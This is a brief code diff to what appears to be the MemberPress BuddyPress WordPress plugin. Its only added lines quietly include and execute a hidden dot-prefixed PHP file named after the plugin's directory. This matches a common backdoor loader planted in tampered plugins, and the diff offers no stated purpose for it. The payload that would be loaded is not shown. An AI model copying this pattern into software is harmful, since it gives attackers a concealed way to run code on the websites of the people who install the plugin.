@@ -37,6 +37,10 @@ if(is_plugin_active('memberpress/memberpress.php')) {
   );
 }
 
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 function mepr_buddypress_load_language() {
   $path = str_replace(WP_PLUGIN_DIR, '', MPBP_I18N_PATH);
   load_plugin_textdomain('memberpress-buddypress', false, $path);
